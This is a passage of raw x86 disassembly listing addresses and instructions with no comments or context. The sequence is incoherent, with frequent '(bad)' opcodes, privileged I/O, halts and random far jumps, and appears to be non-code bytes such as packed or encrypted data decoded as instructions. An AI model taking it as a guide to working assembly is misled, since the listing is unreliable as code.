  4256bc:	jno    0x425739
  4256be:	fistp  WORD PTR [edx+0x34926e24]
  4256c4:	or     cl,BYTE PTR [ebx-0x73bb6799]
  4256ca:	inc    edx
  4256cb:	xchg   edi,eax
  4256cc:	leave  
  4256cd:	aas    
  4256ce:	imul   eax,DWORD PTR gs:[edi+0x20],0xfffffff4
  4256d3:	cmp    BYTE PTR [ecx],dl
  4256d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4256d6:	xchg   edx,eax
  4256d7:	inc    ecx
  4256d8:	das    
  4256d9:	out    dx,eax
  4256da:	mov    cl,bh
  4256dc:	lods   al,BYTE PTR ds:[esi]
  4256dd:	std    
  4256de:	aad    0x11
  4256e0:	sub    cl,BYTE PTR [eax]
  4256e2:	gs add eax,0x861bb15c
  4256e8:	sahf   
  4256e9:	adc    al,0x3b
  4256eb:	shl    BYTE PTR [esi-0x49],cl
  4256ee:	lds    ebp,FWORD PTR [esi]
  4256f0:	stos   BYTE PTR es:[edi],al
  4256f1:	add    eax,0x45dffc11
  4256f6:	test   DWORD PTR [esi+0x57],ebx
  4256f9:	es xchg esp,eax
  4256fb:	jns    0x425699
  4256fd:	or     bl,bh
  4256ff:	xor    al,BYTE PTR [ebx-0x4f]
  425702:	and    al,0xd9
  425704:	not    BYTE PTR [ebx-0x3ab850fa]
  42570a:	loope  0x42569c
  42570c:	cli    
  42570d:	xor    BYTE PTR [ecx+0x119570a5],0x43
  425714:	xor    dh,dh
  425716:	mov    ds:0x4751e4c3,al
  42571b:	cmp    DWORD PTR [eax-0x7bf1b701],ebx
  425721:	lea    edx,[eax+0xaadb88a]
  425727:	lahf   
  425728:	mov    ecx,0xff609381
  42572d:	(bad)  
  42572e:	call   0x6a18470d
  425733:	test   eax,0x38ca7930
  425738:	pop    di
  42573a:	cwde   
  42573b:	imul   ebp,DWORD PTR [esi-0x4c430b6f],0x7b
  425742:	test   eax,0xba6a04b2
  425747:	and    BYTE PTR [ecx+0xe],dh
  42574a:	data16 add BYTE PTR [ebp-0x3f],bh
  42574e:	fwait
  42574f:	inc    ecx
  425750:	loop   0x42570e
  425752:	mov    esp,0x5eee80c9
  425757:	popa   
  425758:	dec    edi
  425759:	mov    eax,0x38003a9f
  42575e:	hlt    
  42575f:	mov    edx,0x746e01f
  425764:	push   edx
  425765:	pop    esp
  425766:	jae    0x425739
  425768:	daa    
  425769:	loop   0x425793
  42576b:	inc    edi
  42576c:	imul   DWORD PTR [esi+0x18]
  42576f:	xchg   edi,eax
  425770:	retf   
  425771:	jo     0x4257ce
  425773:	push   0x53b4ebe2
  425778:	inc    ebp
  425779:	int    0x91
  42577b:	dec    eax
  42577c:	ins    BYTE PTR es:[edi],dx
  42577d:	clc    
  42577e:	test   BYTE PTR [edx+edi*8],cl
  425781:	mov    edi,0xf529f5b6
  425786:	and    esi,DWORD PTR [esi+0x38]
  425789:	std    
  42578a:	or     eax,0x283b1e6d
  42578f:	in     eax,dx
  425790:	and    DWORD PTR [ebx-0x63],esp
  425793:	retf   
  425794:	cwde   
  425795:	nop
  425796:	jnp    0x4257c9
  425798:	adc    BYTE PTR [ecx+0x25],0x7f
  42579c:	cli    
  42579d:	call   0x839dd694
  4257a2:	dec    ebx
  4257a3:	mov    cl,0xde
  4257a5:	imul   edi,DWORD PTR [ecx+0x70],0x8f80e41b
  4257ac:	or     esi,DWORD PTR ds:0xbd50252e
  4257b2:	hlt    
  4257b3:	xchg   DWORD PTR [edx-0x20],ecx
  4257b6:	lds    esi,FWORD PTR [ebx+0x2cf5a2d3]
  4257bc:	inc    ebx
  4257bd:	jge    0x425776
  4257bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4257c0:	pusha  
  4257c1:	xchg   edx,eax
  4257c2:	das    
  4257c3:	mov    ch,0xf0
  4257c5:	dec    esi
  4257c6:	pop    ss
  4257c7:	loope  0x4257d2
  4257c9:	push   eax
  4257ca:	retf   
  4257cb:	jns    0x425814
  4257cd:	push   ebp
  4257ce:	cmp    DWORD PTR [edx+edx*8-0x2b3383c8],esp
  4257d5:	iret   
  4257d6:	iret   
  4257d7:	pop    esp
  4257d8:	sti    
  4257d9:	cmp    eax,0xc5757910
  4257de:	sbb    eax,0x364c3c32
  4257e3:	ret    0x95c
  4257e6:	pop    ss
  4257e7:	xor    DWORD PTR [ecx-0x53629982],edi
  4257ed:	aad    0x87
  4257ef:	jnp    0x425867
  4257f1:	mov    ecx,0x6cb21d37
  4257f6:	ins    DWORD PTR es:[edi],dx
  4257f7:	adc    al,0xe4
  4257f9:	sub    al,0x97
  4257fb:	mov    edx,0xa20c5b9e
  425800:	in     eax,0x79
  425802:	test   al,0xc8
  425804:	mov    esp,0xde12fa69
  425809:	cld    
  42580a:	xchg   ebx,eax
  42580b:	retf   
  42580c:	pop    edi
  42580d:	arpl   WORD PTR [edi+0x55],sp
  425810:	mov    ecx,0x5846374a
  425815:	pusha  
  425816:	add    DWORD PTR [esi+0x7c],0xe
  42581a:	push   ds
  42581b:	call   0x2614:0x13475951
  425822:	dec    esp
  425823:	pop    edx
  425824:	push   esp
  425825:	adc    DWORD PTR [edx],ecx
  425827:	push   0xf8c3ebfb
  42582c:	call   0xeb0c:0x52e4696c
  425833:	push   ebx
  425834:	loop   0x4257ba
  425836:	and    DWORD PTR [ecx],ecx
  425838:	cmp    al,0x4f
  42583a:	inc    edx
  42583b:	jbe    0x42581a
  42583d:	cdq    
  42583e:	inc    eax
  42583f:	sbb    dl,BYTE PTR [ebx+edi*8+0x4b64071f]
  425846:	xlat   BYTE PTR ds:[ebx]
  425847:	jmp    0x425815
  425849:	js     0x425800
  42584b:	dec    ebx
  42584c:	pop    es
  42584d:	in     eax,dx
  42584e:	xor    bh,BYTE PTR [eax+ebp*2-0x2c]
  425852:	std    
  425853:	jl     0x4257d8
  425855:	stc    
  425856:	pop    ebp
  425857:	out    0x35,eax
  425859:	stos   DWORD PTR es:[edi],eax
  42585a:	or     ebx,DWORD PTR [esi-0x6c]
  42585d:	jmp    0x42585f
  42585f:	add    BYTE PTR [eax],al
  425861:	add    BYTE PTR ds:0xaf44af85,al
  425867:	outs   dx,BYTE PTR ds:[esi]
  425868:	out    dx,eax
  425869:	lds    ecx,FWORD PTR [ecx-0x21a2c908]
  42586f:	sti    
  425870:	clc    
  425871:	not    BYTE PTR ds:0xf40001d1
  425877:	add    al,0x0
  425879:	add    BYTE PTR [ebp-0x4f],dh
  42587c:	fsubr  DWORD PTR [ecx-0x2b]
  42587f:	and    BYTE PTR [ebx],ah
  425881:	clc    
  425882:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425883:	rol    BYTE PTR [edi+0x4b],0x23
  425887:	or     bl,BYTE PTR [eax]
  425889:	call   0xe20acb44
  42588e:	push   ebx
  42588f:	jb     0x42584b
  425891:	lea    edx,[edi]
  425893:	add    bl,dl
  425895:	add    eax,edx
  425897:	push   ecx
  425898:	dec    ecx
  425899:	inc    ecx
  42589a:	rcr    DWORD PTR [ebp-0x6d8b73d3],0xa1
  4258a1:	call   0x266:0xf4a0a49f
  4258a8:	mov    ah,0xa1
  4258aa:	add    dl,al
  4258ac:	pop    edi
  4258ad:	fwait
  4258ae:	pop    eax
  4258af:	repnz adc ebx,edi
  4258b2:	stos   BYTE PTR es:[edi],al
  4258b3:	sub    eax,0xbd673865
  4258b8:	out    0x0,eax
  4258ba:	iret   
  4258bb:	stos   BYTE PTR es:[edi],al
  4258bc:	cmp    al,0x78
  4258be:	inc    edx
  4258bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4258c0:	sahf   
  4258c1:	fist   WORD PTR [ebx-0x3b]
  4258c4:	bound  eax,QWORD PTR [edi+ecx*4]
  4258c7:	in     eax,dx
  4258c8:	sub    DWORD PTR [edx-0x28],ebx
  4258cb:	dec    ecx
  4258cc:	(bad)  
  4258cd:	add    BYTE PTR [edx+ebx*4-0x66ac9493],cl
  4258d4:	sahf   
  4258d5:	out    0x1d,al
  4258d7:	xchg   edi,eax
  4258d8:	iret   
  4258d9:	mov    DWORD PTR [edi-0x1a],esi
  4258dc:	ins    BYTE PTR es:[edi],dx
  4258dd:	(bad)  
  4258de:	mov    es,WORD PTR [edi]
  4258e0:	push   ebp
  4258e1:	or     eax,0x69eb7fd
  4258e6:	mov    BYTE PTR ds:0xd995b770,bh
  4258ec:	adc    al,0x10
  4258ee:	jle    0x4258b2
  4258f0:	not    BYTE PTR ds:0xf3d62050
  4258f6:	pusha  
  4258f7:	sub    ebx,DWORD PTR [ebp+0x5f]
  4258fa:	mov    BYTE PTR [ecx-0x7],bl
  4258fd:	arpl   WORD PTR [edi],di
  4258ff:	cs inc esi
  425901:	aad    0x14
  425903:	dec    edi
  425904:	push   edi
  425905:	push   ds
  425906:	outs   dx,DWORD PTR ds:[esi]
  425907:	cmp    DWORD PTR [ecx+0x378bf77e],edx
  42590d:	leave  
  42590e:	mov    BYTE PTR [eax-0x2015626a],bh
  425914:	xchg   edi,eax
  425915:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425916:	mov    cl,0xe
  425918:	js     0x425937
  42591a:	xchg   DWORD PTR [ebp+0x49],ebx
  42591d:	pop    es
  42591e:	ins    DWORD PTR es:[edi],dx
  42591f:	repnz sub BYTE PTR [edx],cl
  425922:	jle    0x425996
  425924:	mov    esi,0x5616706
  425929:	leave  
  42592a:	mov    al,0x3d
  42592c:	dec    ebp
  42592d:	sbb    DWORD PTR [ebx-0x4a41e4d6],ebx
  425933:	ds (bad) 
  425935:	cmp    BYTE PTR [edi-0x455bf9e6],bh
  42593b:	xchg   ebp,eax
  42593c:	bound  edx,QWORD PTR [esi-0x7e8d12e8]
  425942:	rol    BYTE PTR [edx-0x45],1
  425945:	rcl    bh,0x75
  425948:	or     edi,DWORD PTR [edx-0x4d]
  42594b:	test   ebx,0xb82dfacc
  425951:	int    0xe5
  425953:	dec    esp
  425954:	fwait
  425955:	fs retf 0xf40a
  425959:	sbb    dh,BYTE PTR [esi+0x5ad6758b]
  42595f:	adc    DWORD PTR [ebx-0x23],ecx
  425962:	sub    ecx,DWORD PTR [eax+0x31]
  425965:	mov    esp,0x2050b491
  42596a:	and    bl,BYTE PTR [ecx+0x51f540e]
  425970:	mov    eax,0x1dfaae73
  425975:	mov    edx,0xc91bc3ac
  42597a:	mov    ecx,0xe244f8ea
  42597f:	mov    esp,0xb1f7c901
  425984:	imul   ecx,DWORD PTR [esi+esi*1+0x5f0df9ca],0xffffffcf
  42598c:	outs   dx,BYTE PTR ds:[esi]
  42598d:	fmul   st,st(1)
  42598f:	mov    ah,0xd9
  425991:	pop    ds
  425992:	stos   BYTE PTR es:[edi],al
  425993:	pop    edx
  425994:	and    bh,BYTE PTR [ebp-0x5a]
  425997:	add    al,BYTE PTR [ecx]
  425999:	and    ebx,esi
  42599b:	and    esi,DWORD PTR [ecx]
  42599d:	mov    eax,ds:0x2e03b2c
  4259a2:	fwait
  4259a3:	popaw  
  4259a5:	aaa    
  4259a6:	call   0x5876:0xd79a12fa
  4259ad:	mov    edi,edx
  4259af:	xchg   DWORD PTR [edi-0xf],eax
  4259b2:	call   0xaa6d2901
  4259b7:	test   al,0x28
  4259b9:	adc    DWORD PTR [edi],esp
  4259bb:	sbb    edi,DWORD PTR [ebp+0x4c3d9f77]
  4259c1:	fdivr  DWORD PTR [eax]
  4259c3:	and    ebx,esi
  4259c5:	jecxz  0x4259ed
  4259c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4259c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4259c9:	jmp    0x9f57e8e8
  4259ce:	iret   
  4259cf:	(bad)  
  4259d0:	push   ebx
  4259d1:	jl     0x425a46
  4259d3:	push   0x974047fa
  4259d8:	cmp    esi,edi
  4259da:	(bad)  
  4259db:	pop    edi
  4259dc:	cmp    BYTE PTR [edi-0x13fd82e0],0x32
  4259e3:	add    al,0xa2
  4259e5:	inc    edx
  4259e6:	add    DWORD PTR [edi+ecx*1+0x7616afe7],ebp
  4259ed:	xchg   ecx,eax
  4259ee:	pop    ebx
  4259ef:	pop    edi
  4259f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4259f1:	mov    ebp,fs
  4259f3:	cmp    BYTE PTR [edi-0xa],dh
  4259f6:	mov    edi,0x7b21199e
  4259fb:	ss test al,0x78
  4259fe:	mov    eax,ds:0xd147f0c4
  425a03:	mov    eax,ds:0xfa94e50e
  425a08:	cld    
  425a09:	aad    0x33
  425a0b:	fs pusha 
  425a0d:	push   0x9d456576
  425a12:	pop    esp
  425a13:	rcl    BYTE PTR [edi-0x417292cf],0xbb
  425a1a:	add    BYTE PTR [ebp-0x28c5063d],cl
  425a20:	sub    BYTE PTR [eax],dl
  425a22:	cmc    
  425a23:	mov    ah,0x75
  425a25:	pop    esp
  425a26:	inc    bp
  425a28:	mov    ah,0x63
  425a2a:	je     0x425aa8
  425a2c:	pushf  
  425a2d:	repz ds hlt 
  425a30:	mov    eax,0xafbd21bd
  425a35:	jmp    0x976b:0x602e7a0a
  425a3c:	pop    edx
  425a3d:	leave  
  425a3e:	inc    ecx
  425a3f:	mov    al,0xcf
  425a41:	xor    BYTE PTR [ebx-0x4e8bc1ce],al
  425a47:	ins    BYTE PTR es:[edi],dx
  425a48:	pop    ebx
  425a49:	addr16 ret 
  425a4b:	test   al,0xb3
  425a4d:	enter  0xfa94,0xda
  425a51:	push   edi
  425a52:	inc    ecx
  425a53:	js     0x425abd
  425a55:	call   0x6e117a8a
  425a5a:	int    0xa8
  425a5c:	xchg   ebp,eax
  425a5d:	jg     0x425a46
  425a5f:	in     al,dx
  425a60:	adc    DWORD PTR [eax+ebx*1],esi
  425a63:	in     al,dx
  425a64:	pop    ebx
  425a65:	fst    QWORD PTR [edi-0x69]
  425a68:	fmul   QWORD PTR [edx+0xe]
  425a6b:	inc    ebp
  425a6c:	inc    esp
  425a6d:	and    ebp,DWORD PTR [eax-0x5c]
  425a70:	test   BYTE PTR [ebp-0x257db286],bh
  425a76:	mov    esi,0x5edf5604
  425a7b:	mov    al,ds:0xa68be23
  425a80:	pop    ebx
  425a81:	dec    esp
  425a82:	mov    edi,0xf0b2101c
  425a87:	adc    BYTE PTR [esp+ecx*1],al
  425a8a:	hlt    
  425a8b:	iret   
  425a8c:	mov    WORD PTR [esp+ebx*2+0x41],cs
  425a90:	pop    ss
  425a91:	sbb    ebx,0x59
  425a94:	je     0x425aac
  425a96:	lods   eax,DWORD PTR ds:[esi]
  425a97:	ins    DWORD PTR es:[edi],dx
  425a98:	xor    al,0x4c
  425a9a:	(bad)  
  425a9b:	fstp   QWORD PTR [esp+edi*4]
  425a9e:	loope  0x425ab8
  425aa0:	inc    edi
  425aa1:	and    al,0x86
  425aa3:	sahf   
  425aa4:	push   es
  425aa5:	xor    bl,BYTE PTR [ebx+0x4a]
  425aa8:	xor    esp,DWORD PTR [ebx-0x6efb9ff]
  425aae:	cmp    bl,BYTE PTR [edx+0x1cc78f77]
  425ab4:	or     BYTE PTR [esi-0x2d],0xb7
  425ab8:	in     eax,0xfa
  425aba:	mov    bh,0xe6
  425abc:	mov    ebp,0x27450d86
  425ac1:	sub    dl,BYTE PTR [edi]
  425ac3:	vpaddsw xmm7,xmm0,XMMWORD PTR [eax]
  425ac7:	xchg   ebp,eax
  425ac8:	pop    es
  425ac9:	loop   0x425abc
  425acb:	sbb    edi,DWORD PTR [ebx]
  425acd:	rcl    BYTE PTR [ebp+0x462b1d15],0x28
  425ad4:	xchg   edx,eax
  425ad5:	lods   eax,DWORD PTR ds:[esi]
  425ad6:	test   BYTE PTR [eax+0x30],cl
  425ad9:	xchg   esi,eax
  425ada:	dec    esi
  425adb:	or     DWORD PTR ds:0xa4f764a8,edx
  425ae1:	pop    esi
  425ae2:	fwait
  425ae3:	daa    
  425ae4:	jp     0x425aaf
  425ae6:	mov    ch,0x61
  425ae8:	jge    0x425aab
  425aea:	ret    0x2b44
  425aed:	aam    0x2f
  425aef:	iret   
  425af0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425af1:	les    esp,FWORD PTR [esp+edx*1]
  425af4:	outs   dx,DWORD PTR ds:[esi]
  425af5:	fild   QWORD PTR [eax+0x65]
  425af8:	stc    
  425af9:	in     al,0xb1
  425afb:	push   ss
  425afc:	mov    ds:0xfaf46cba,eax
  425b01:	mov    cl,BYTE PTR [eax]
  425b03:	repz shl ecx,cl
  425b06:	in     eax,dx
  425b07:	inc    esp
  425b08:	jl     0x425b39
  425b0a:	fidiv  DWORD PTR [edi]
  425b0c:	sub    edx,esp
  425b0e:	cdq    
  425b0f:	jae    0x425b29
  425b11:	mov    edx,0x283165f6
  425b16:	cmp    DWORD PTR [ebx],ebx
  425b18:	cmc    
  425b19:	in     al,dx
  425b1a:	call   0xf803:0x72de6fa0
  425b21:	push   0xffffffeb
  425b23:	xor    ebp,DWORD PTR [ecx]
  425b25:	fcmovnu st,st(3)
  425b27:	and    BYTE PTR [esp+ebp*8+0xf],dh
  425b2b:	push   ss
  425b2c:	cs sar edx,1
  425b2f:	mov    edx,0x68b7bd0a
  425b34:	xor    DWORD PTR ds:0x36bc1b8f,edi
  425b3a:	shl    dl,1
  425b3c:	repnz xor dh,0xda
  425b40:	mov    cl,0x4f
  425b42:	or     ah,0x42
  425b45:	cmp    DWORD PTR [eax-0x44efc42],ecx
  425b4b:	cmp    DWORD PTR [edi-0x17],ecx
  425b4e:	push   es
  425b4f:	push   esp
  425b50:	xchg   esp,eax
  425b51:	mov    al,ds:0x6a191618
  425b56:	or     al,0xfc
  425b58:	out    dx,al
  425b59:	(bad)  
  425b5a:	mov    dh,0x29
  425b5c:	sub    DWORD PTR [esi-0xd],ebx
  425b5f:	pushf  
  425b60:	inc    edx
  425b61:	mov    dl,0x66
  425b63:	push   0x57
  425b65:	fist   DWORD PTR [edx+0x41f70b85]
  425b6b:	fcmovne st,st(7)
  425b6d:	push   ss
  425b6e:	test   eax,0x84fa84f6
  425b73:	push   ds
  425b74:	sub    esi,esp
  425b76:	mov    bh,0x2a
  425b78:	and    eax,0x2a0fbec9
  425b7d:	mov    al,ds:0x8a80176a
  425b82:	rol    BYTE PTR [ebp-0x1e6bee2f],1
  425b88:	add    ch,dl
  425b8a:	inc    esi
  425b8b:	popa   
  425b8c:	dec    esi
  425b8d:	cli    
  425b8e:	out    0xb0,al
  425b90:	int    0xab
  425b92:	sub    eax,0xf29036c3
  425b97:	and    edx,DWORD PTR [edi-0x74b52eb6]
  425b9d:	push   ecx
  425b9e:	loopne 0x425b66
  425ba0:	adc    BYTE PTR [edi+0x65],ah
  425ba3:	js     0x425c0c
  425ba5:	ins    BYTE PTR es:[edi],dx
  425ba6:	sub    al,0x6
  425ba8:	cmp    al,0x6c
  425baa:	and    DWORD PTR [bx+di-0xfef],esp
  425baf:	loop   0x425b9b
  425bb1:	hlt    
  425bb2:	xchg   cl,dl
  425bb4:	dec    esi
  425bb5:	fistp  DWORD PTR [esp+edi*1-0x39]
  425bb9:	add    eax,0xd9678f6c
  425bbe:	ins    DWORD PTR es:[edi],dx
  425bbf:	add    bl,ah
  425bc1:	outs   dx,DWORD PTR ds:[esi]
  425bc2:	stc    
  425bc3:	retf   0x8cb6
  425bc6:	ins    BYTE PTR es:[edi],dx
  425bc7:	or     ebx,DWORD PTR [edx]
  425bc9:	iret   
  425bca:	or     ecx,0x14e8e7a4
  425bd0:	xor    ch,ch
  425bd2:	ins    DWORD PTR es:[edi],dx
  425bd3:	dec    ebx
  425bd4:	jns    0x425c51
  425bd6:	adc    al,0xc0
  425bd8:	shl    BYTE PTR [ecx],1
  425bda:	stos   DWORD PTR es:[edi],eax
  425bdb:	jecxz  0x425b7d
  425bdd:	or     DWORD PTR [eax-0x5b],ebp
  425be0:	ins    BYTE PTR es:[edi],dx
  425be1:	push   esp
  425be2:	and    ah,BYTE PTR [eax-0x9cb21a6]
  425be8:	xchg   esi,eax
  425be9:	ins    DWORD PTR es:[edi],dx
  425bea:	ret    
  425beb:	in     al,0x72
  425bed:	mov    esi,?
  425bef:	xor    eax,0xb0d3991a
  425bf4:	xchg   esi,eax
  425bf5:	push   eax
  425bf6:	mov    al,ch
  425bf8:	pop    esi
  425bf9:	mov    DWORD PTR [ebx-0x7e570e70],esi
  425bff:	dec    esp
  425c00:	jae    0x425bb6
  425c02:	xchg   ebx,eax
  425c03:	pop    ds
  425c04:	lods   eax,DWORD PTR ds:[esi]
  425c05:	stos   BYTE PTR es:[edi],al
  425c06:	data16 fs aas 
  425c09:	jecxz  0x425c11
  425c0b:	lods   al,BYTE PTR ds:[esi]
  425c0c:	dec    esp
  425c0d:	(bad)  
  425c0e:	std    
  425c0f:	rol    BYTE PTR [esi+0x7235ef11],0x12
  425c16:	sub    edi,0x9b2233f7
  425c1c:	loope  0x425bd9
  425c1e:	dec    edx
  425c1f:	out    dx,al
  425c20:	pop    es
  425c21:	cmp    DWORD PTR [ecx],esp
  425c23:	pop    esp
  425c24:	jbe    0x425bd1
  425c26:	xchg   DWORD PTR [edi-0xe26cd7],esi
  425c2c:	aaa    
  425c2d:	xor    dh,bh
  425c2f:	mov    DWORD PTR [edx-0x1a],esi
  425c32:	popf   
  425c33:	(bad)
  425c36:	jno    0x425c1f
  425c38:	mov    cl,0xa
  425c3a:	and    eax,0xfacd60b9
  425c3f:	mov    dh,0xaa
  425c41:	cmp    DWORD PTR [eax],ebp
  425c43:	xbegin 0xf73d5a49
  425c49:	ins    BYTE PTR es:[edi],dx
  425c4a:	cld    
  425c4b:	or     ax,0x80cc
  425c4f:	or     ah,dl
  425c51:	jle    0x425c71
  425c53:	pop    ecx
  425c54:	jno    0x425cbc
  425c56:	xor    ah,dh
  425c58:	fwait
  425c59:	ins    DWORD PTR es:[edi],dx
  425c5a:	dec    ebp
  425c5b:	jne    0x425c4a
  425c5d:	push   cs
  425c5e:	ret    
  425c5f:	mov    ds:0xe40e3097,al
  425c64:	mov    BYTE PTR [ebp+0x53251aa0],ah
  425c6a:	sub    ah,dh
  425c6c:	fidiv  DWORD PTR [esi]
  425c6e:	pop    esp
  425c6f:	popf   
  425c70:	push   edi
  425c71:	fnstcw WORD PTR [esi+0x3b2e9b0a]
  425c77:	jne    0x425c6a
  425c79:	inc    ebp
  425c7a:	shl    DWORD PTR [ebx+ecx*8+0x62],0xbf
  425c7f:	push   ebp
  425c80:	retf   0x941d
  425c83:	jecxz  0x425c24
  425c85:	mov    dh,BYTE PTR [ebx+0x37127e33]
  425c8b:	mov    ds:0xb46bf84f,eax
  425c90:	leave  
  425c91:	xchg   edx,eax
  425c92:	pop    esp
  425c93:	cwde   
  425c94:	not    bh
  425c96:	and    BYTE PTR [eax-0x60],ch
  425c99:	and    eax,0xed53b18
  425c9e:	shl    DWORD PTR [ebp-0x20],1
  425ca1:	dec    edx
  425ca2:	cli    
  425ca3:	aas    
  425ca4:	sub    ebp,ebp
  425ca6:	adc    BYTE PTR [edx+0x6d1b0078],0xc2
  425cad:	mov    DWORD PTR [ebp-0x23],esi
  425cb0:	fmul   QWORD PTR fs:[ebp-0x72]
  425cb4:	mov    edx,0x70ac7a23
  425cb9:	pop    esi
  425cba:	adc    al,0xf2
  425cbc:	fcomp  QWORD PTR [esi+0x4]
  425cc0:	push   ebx
  425cc1:	mov    edx,0x1738f344
  425cc6:	lahf   
  425cc7:	rcl    DWORD PTR [esi-0x13],0x75
  425ccb:	sub    ebx,DWORD PTR [edx-0x30]
  425cce:	(bad)  
  425cd0:	lahf   
  425cd1:	es push 0x1a
  425cd4:	ja     0x425d39
  425cd6:	into   
  425cd7:	cmp    BYTE PTR [edi+0x7d],dl
  425cda:	(bad)  
  425cdc:	lock (bad) 
  425cde:	and    eax,0xe86699aa
  425ce3:	sbb    bl,ah
  425ce5:	mov    ds:0x19ff6288,eax
  425cea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425ceb:	cld    
  425cec:	sub    esi,DWORD PTR [edx-0x7a]
  425cef:	dec    edi
  425cf0:	and    DWORD PTR [edi],esi
  425cf2:	hlt    
  425cf3:	inc    ebp
  425cf4:	cmp    eax,0x3af73a89
  425cf9:	or     al,0xd4
  425cfb:	dec    ecx
  425cfc:	into   
  425cfd:	shl    DWORD PTR [edi+edx*1-0x6b],1
  425d01:	bound  esi,QWORD PTR [ecx]
  425d03:	aas    
  425d04:	clc    
  425d05:	stos   DWORD PTR es:[edi],eax
  425d06:	mov    WORD PTR [edi-0x8],fs
  425d09:	mov    eax,0xc4204af2
  425d0e:	ror    DWORD PTR [eax],0xb5
  425d11:	sbb    al,0x86
  425d13:	inc    edx
  425d14:	inc    ebx
  425d15:	loope  0x425ce4
  425d17:	push   ss
  425d18:	mov    ecx,DWORD PTR [ebx]
  425d1a:	or     ebp,ebx
  425d1c:	jle    0x425d57
  425d1e:	ds icebp 
  425d20:	sbb    DWORD PTR [edx+0x2f],ebx
  425d23:	out    dx,eax
  425d24:	xor    edi,DWORD PTR [ebp-0x45]
  425d27:	add    ebp,esp
  425d29:	pop    es
  425d2a:	out    0x5a,eax
  425d2c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425d2d:	fnsave gs:[ecx-0x4b]
  425d31:	je     0x425d7c
  425d33:	je     0x425d0e
  425d35:	mul    bl
  425d37:	xchg   esp,eax
  425d38:	aaa    
  425d39:	pop    eax
  425d3a:	adc    edi,edi
  425d3c:	ror    DWORD PTR [esi-0x7ac541a8],1
  425d42:	pop    edx
  425d43:	push   cs
  425d44:	sub    al,0x4d
  425d46:	cwde   
  425d47:	push   cs
  425d48:	mov    esi,0x956848f4
  425d4d:	out    dx,al
  425d4e:	ins    DWORD PTR es:[edi],dx
  425d4f:	mov    ds:0x981a2370,al
  425d54:	pop    ebp
  425d55:	rol    BYTE PTR ds:0x1e09e5e6,cl
  425d5b:	dec    edi
  425d5c:	fild   QWORD PTR [eax]
  425d5e:	sub    bh,BYTE PTR [ebp+0x6]
  425d61:	push   ss
  425d62:	loop   0x425d03
  425d64:	test   DWORD PTR [esp+esi*8],eax
  425d67:	sbb    edi,ebp
  425d69:	mov    al,BYTE PTR [edx+0x34acba]
  425d6f:	add    BYTE PTR [eax],al
  425d71:	add    dh,ch
  425d73:	retf   0xd589
  425d76:	lods   eax,DWORD PTR ds:[esi]
  425d77:	xlat   BYTE PTR ds:[ebx]
  425d78:	(bad)  
  425d79:	sti    
  425d7a:	(bad)  
  425d7c:	mov    ss,WORD PTR [ebp+esi*4+0x71]
  425d80:	jae    0x425dbb
  425d82:	or     esi,edx
  425d84:	add    DWORD PTR [eax],eax
  425d86:	hlt    
  425d87:	add    al,0x0
  425d89:	add    cl,ah
  425d8b:	pop    es
  425d8c:	add    al,0x7a
  425d8e:	call   0x1d1e39fb
  425d93:	jmp    eax
  425d95:	out    dx,al
  425d96:	sti    
  425d97:	and    eax,0x430d7770
  425d9c:	cli    
  425d9d:	sbb    al,0xa7
  425d9f:	mov    WORD PTR ds:0xeee8e38,ss
  425da5:	and    esp,DWORD PTR [eax+0x1c]
  425da8:	sbb    al,BYTE PTR [ebx-0x69]
  425dab:	jge    0x425dff
  425dad:	sar    BYTE PTR [edx-0x6ec67eff],cl
  425db3:	enter  0xef91,0xab
  425db7:	pop    esp
  425db8:	call   0xdf8e7bd
  425dbd:	mov    ecx,0xa41ac832
  425dc2:	fstp   TBYTE PTR [eax+0x2]
  425dc5:	add    al,0x9d
  425dc7:	(bad)  
  425dc8:	mov    edx,0x3319bd0d
  425dcd:	hlt    
  425dce:	cmc    
  425dcf:	xchg   BYTE PTR [ebp+0x3643aeb4],ch
  425dd5:	push   0x1f5ff085
  425dda:	(bad)  
  425ddb:	rol    DWORD PTR [edx+0x35],1
  425dde:	fs dec edx
  425de0:	ins    DWORD PTR es:[edi],dx
  425de1:	mov    bh,0x60
  425de3:	xchg   edx,eax
  425de4:	jmp    0x425d8f
  425de6:	ror    dh,0xaa
  425de9:	jo     0x425dde
  425deb:	dec    ebp
  425dec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425ded:	mov    edx,0x432ef720
  425df2:	push   ss
  425df3:	adc    eax,0xc6878e96
  425df8:	mov    edx,0xdb669c73
  425dfd:	mov    bh,0xd5
  425dff:	cmc    
  425e00:	ins    DWORD PTR es:[edi],dx
  425e01:	pop    ds
  425e02:	sar    DWORD PTR [ebx+0x66],0xba
  425e06:	jle    0x425e07
  425e08:	ja     0x425dc0
  425e0a:	xor    al,0xa
  425e0c:	jo     0x425d97
  425e0e:	mov    dl,0xaf
  425e10:	outs   dx,DWORD PTR ds:[esi]
  425e11:	pop    ds
  425e12:	jmp    0x425dcc
  425e14:	lahf   
  425e15:	jnp    0x425e25
  425e17:	inc    ebp
  425e18:	std    
  425e19:	pop    ss
  425e1a:	cmc    
  425e1b:	push   eax
  425e1c:	(bad)  
  425e1d:	iret   
  425e1e:	ret    
  425e1f:	pop    es
  425e20:	sub    eax,0x4186495c
  425e25:	ds inc ebp
  425e27:	pop    es
  425e28:	pop    ecx
  425e29:	add    al,BYTE PTR [edx+0x63]
  425e2c:	fisubr WORD PTR [edi-0x38b5a732]
  425e32:	sahf   
  425e33:	arpl   WORD PTR [edi+0x1d],dx
  425e36:	xor    dl,BYTE PTR [edi+0x1a]
  425e39:	mov    edi,0x4fb21c9d
  425e3e:	stos   BYTE PTR es:[edi],al
  425e3f:	or     eax,0xb669090e
  425e44:	pusha  
  425e45:	xchg   BYTE PTR [esi-0x25],dh
  425e48:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425e49:	aaa    
  425e4a:	adc    eax,0x83734fee
  425e4f:	ins    DWORD PTR es:[edi],dx
